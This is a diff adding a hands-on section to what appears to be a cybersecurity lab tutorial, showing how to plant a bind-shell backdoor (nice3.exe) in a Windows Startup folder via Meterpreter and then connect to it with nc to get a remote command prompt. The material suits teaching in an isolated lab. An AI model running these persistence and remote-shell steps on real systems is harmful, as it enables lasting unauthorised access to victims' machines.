@@ -614,6 +614,30 @@ and uh so i don't have the bigger kind of a picture of what is going on over the
 i think it is good to teach beginners before
 -->
 
+## Hands-on: Deploying persistent backdoor
+
+1. The attacker hacks into the target and opens a Meterpreter shell.
+
+2. Within the Meterpreter shell, *upload* the backdoor to the startup folder
+
+```
+meterpreter > upload /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe C:\\Users\\"Malware Analysis"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\nice3.exe
+[*] uploading  : /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
+[*] Uploaded 49.83 KiB of 49.83 KiB (100.0%): /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
+[*] uploaded   : /home/kali/GenCyber/MalwareSamples/Backdoors/SimpleBindBackdoor/nice3.exe -> C:\Users\Malware Analysis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nice3.exe
+```
+Please pay attention to how the long folder name with multiple words is quoted.
+
+3. Restart Windows VM, use *nc* at Kali VM log into the backdoor
+```
+┌──(kali㉿Cyber-Range)-[~]
+└─$ nc 192.168.1.19 8080    
+Microsoft Windows [Version 10.0.19044.1706]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
 # References
 - v4L, <a href="https://www.hacking-tutorial.com/tips-and-trick/13-metasploit-meterpreter-file-system-command-you-should-know/#sthash.R7VFJW1l.dpbs">13 Metasploit Meterpreter File System Command You Should Know</a>
 - <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">METERPRETER BASIC COMMANDS</a>
